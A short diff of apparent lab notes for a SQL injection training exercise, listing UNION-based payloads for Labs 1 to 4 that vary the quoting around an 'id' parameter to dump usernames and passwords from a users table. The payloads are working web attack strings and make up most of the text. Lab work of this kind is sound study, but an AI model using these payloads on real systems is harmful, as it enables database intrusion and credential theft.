@@ -25,11 +25,14 @@ In this we try to breach the usernames and passwords from the backend database. 
 `?id=-1’ union select 1,group_concat(username),group_concat(password) from users --+` to break the code
 ### LAB 2
 This accept only integers so it cannot take strings as input
+
 `?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+` 
 ### LAB 3
 Same as the first one with the addition of a bracket 
+
 `?id=-1%27)union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+`
 ### LAB 4
 This is a double quote query
+
 `?id=-1") union select 1,group_concat(username),group_concat(password) from users--+` breaks the code
  
